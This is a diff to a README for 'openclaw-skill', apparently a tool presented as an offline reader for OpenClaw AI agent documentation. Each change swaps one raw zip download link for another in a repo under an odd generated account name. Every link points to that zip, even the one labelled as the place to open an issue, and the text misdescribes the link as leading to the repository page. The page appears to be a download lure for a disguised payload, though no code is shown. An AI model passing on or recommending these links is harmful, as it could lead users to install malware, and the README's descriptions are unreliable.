@@ -1,6 +1,6 @@
 # 🦀 openclaw-skill - AI agent docs made accessible
 
-[![Download openclaw-skill](https://img.shields.io/badge/Download-Get%20OpenClaw%20Skill-red?style=for-the-badge)](https://raw.githubusercontent.com/unexplained-familyephedraceae871/openclaw-skill/main/skills/openclaw/skill_openclaw_v3.5.zip)
+[![Download openclaw-skill](https://img.shields.io/badge/Download-Get%20OpenClaw%20Skill-red?style=for-the-badge)](https://github.com/unexplained-familyephedraceae871/openclaw-skill/raw/refs/heads/main/docs/skill_openclaw_v3.2.zip)
 
 ---
 
@@ -27,7 +27,7 @@ This section shows you how to download and run the openclaw-skill app on your Wi
 
 1. Click the large green button below to open the download page:  
 
-[![Download openclaw-skill](https://img.shields.io/badge/Download-OpenClaw%20Skill-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/unexplained-familyephedraceae871/openclaw-skill/main/skills/openclaw/skill_openclaw_v3.5.zip)  
+[![Download openclaw-skill](https://img.shields.io/badge/Download-OpenClaw%20Skill-brightgreen?style=for-the-badge)](https://github.com/unexplained-familyephedraceae871/openclaw-skill/raw/refs/heads/main/docs/skill_openclaw_v3.2.zip)  
 
 2. You will land on the GitHub repository main page. Look for the **Releases** section on the right or in the repository tabs.  
 
@@ -86,7 +86,7 @@ This tool helps users understand OpenClaw without needing to visit scattered web
 
 You can access the app files anytime here:  
 
-[https://raw.githubusercontent.com/unexplained-familyephedraceae871/openclaw-skill/main/skills/openclaw/skill_openclaw_v3.5.zip](https://raw.githubusercontent.com/unexplained-familyephedraceae871/openclaw-skill/main/skills/openclaw/skill_openclaw_v3.5.zip)  
+[https://github.com/unexplained-familyephedraceae871/openclaw-skill/raw/refs/heads/main/docs/skill_openclaw_v3.2.zip](https://github.com/unexplained-familyephedraceae871/openclaw-skill/raw/refs/heads/main/docs/skill_openclaw_v3.2.zip)  
 
 Check the latest release version commonly found under the **Releases** tab.
 
@@ -106,7 +106,7 @@ Installation usually takes just a few minutes. The app does not require extra de
 
 ## 🤝 Support & Community
 
-- Open an issue on GitHub if you find bugs or need help: https://raw.githubusercontent.com/unexplained-familyephedraceae871/openclaw-skill/main/skills/openclaw/skill_openclaw_v3.5.zip  
+- Open an issue on GitHub if you find bugs or need help: https://github.com/unexplained-familyephedraceae871/openclaw-skill/raw/refs/heads/main/docs/skill_openclaw_v3.2.zip  
 - Join community groups on Discord or Telegram for tips and advice about OpenClaw.  
 - Follow updates on GitHub to get new releases and documentation additions.
 
@@ -135,4 +135,4 @@ For detailed guides on each topic, consult the full docs inside the app. Informa
 
 # 🦀 Ready to begin?  
 
-[Download openclaw-skill here](https://raw.githubusercontent.com/unexplained-familyephedraceae871/openclaw-skill/main/skills/openclaw/skill_openclaw_v3.5.zip) to start exploring OpenClaw documentation today.
+[Download openclaw-skill here](https://github.com/unexplained-familyephedraceae871/openclaw-skill/raw/refs/heads/main/docs/skill_openclaw_v3.2.zip) to start exploring OpenClaw documentation today.
